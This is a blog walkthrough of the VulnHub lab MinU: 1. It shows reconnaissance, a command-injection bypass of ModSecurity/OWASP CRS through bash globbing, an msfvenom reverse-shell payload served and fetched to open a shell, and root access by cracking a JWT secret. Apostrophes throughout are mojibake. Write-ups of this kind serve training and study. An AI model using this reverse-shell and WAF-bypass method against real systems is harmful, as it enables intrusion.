@@ -1,0 +1,133 @@
+
+
+O, wasp!
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+11 Sep 2018
+
+
+
+4 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of MinU: 1, a boot2root VM created by 8bitsec, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+This boot2root is an Ubuntu Based virtual machine and has been tested using VirtualBox. The network interface of the virtual machine will take itâs IP settings from DHCP. Your goal is to capture the flag on /root.
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
+...
+PORT   STATE SERVICE REASON         VERSION
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.27
+|_http-server-header: Apache/2.4.27 (Ubuntu)
+|_http-title: 403 Forbidden
+
+This should be fun. nmap finds one open port: 80/tcp.
+Directory/File Enumeration
+Letâs use wfuzz to fuzz the site and see what we are up against.
+
+Somethingâs up. Thereâs way too many 403s. Probably some Rewrite rules and/or a Web Application Firewall (WAF) are in place.
+
+Now, this is more like it.
+ModSecurity (OWASP CRS)
+Letâs use wafw00f to determine if thereâs a WAF in place.
+
+Damn.
+Letâs not get too hung up on the WAF. Check out the HTML source code of /test.php.
+
+Looks like thereâs an intention to delay loading with JavaScript. Letâs disable JavaScript.
+
+No js yay! But, are we looking at a Local File Inclusion (LFI) vulnerability here?
+
+
+Anyway, long story short. Itâs not LFI, itâs something elseâremote command execution. Basically, this is an exercise in bypassing OWASP CRS.
+Remote Command Execution
+Donât believe it? Look here.
+
+What do you see? The file parameter accepts a pipe (|) character and the rev command, resulting in the contents of last.html reversed. You know what, itâs always better to see it in curl.
+
+Voila. This is indeed an exercise to bypass OWASP CRS to execute commands.
+A tutorial on how ModSecurity and OWASP CRS work is beyond the scope of this walkthrough. Suffice to say, they work based on pattern matching hella of complex looking regular expressions.
+Because bash enables wildcards (asterisk * and question mark ?) for globbing in the VM, we can leverage that to bypass the OWASP CRS filters.
+Hereâs an example to view /etc/passwd.
+
+Hereâs an example to execute the ls command.
+
+Low-Privilege Shell
+We can now make use of the above to give ourselves a low-privilege shell. Weâll pull a reverse shell (generated with msfvenom) with wget, but first we need to determine whether the OS is 32-bit or 64-bit with uname.
+
+Generate a reverse shell with msfvenom.
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.30.128 LPORT=1234 -f elf -o rev
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of elf file: 152 bytes
+Saved as: rev
+
+Host it with Pythonâs SimpleHTTPServer.
+# python -m SimpleHTTPServer 80
+
+Download the reverse shell like so.
+
+Check if the download was successful.
+
+Now, make rev executable with chmod.
+
+
+Time to execute the reverse shell. Before we do that, letâs set up our nc listener.
+
+Hooray. A shell at last.
+
+Privilege Escalation
+During enumeration of bobâs account, I noticed the presence of a JSON web token (JWT) in /home/bob/._pw_. Hereâs how it looks like.
+
+JWT has three parts in this format:
+base64(header).base64(payload).base64(signature)
+
+
+
+header specifies the algorithm and the type in JSON.
+
+payload specifies the claim of the token, also in JSON.
+
+signature is the digital signature of the encoded header and payload.
+
+Thereâs a online debugger that we can use to find out the header and payload.
+
+Judging by the file name, I guess we need to crack the JWT to determine the secret used in HS256 to create the signature.
+JWT Cracker
+Searching for âjwt crack githubâ in Google gave plenty of results. I decided on c-jwt-cracker based on performance considerationsâitâs multi-threaded and written in C.
+Cracking the JWT with it, is crazy fast compared to the rest.
+
+Whatâs the Flag (WTF)
+It turns out that the secret is rootâs password. With that, getting the flag is trivial.
+
+
+Afterthought
+I had a fun time trying out different JWT crackers. 
+
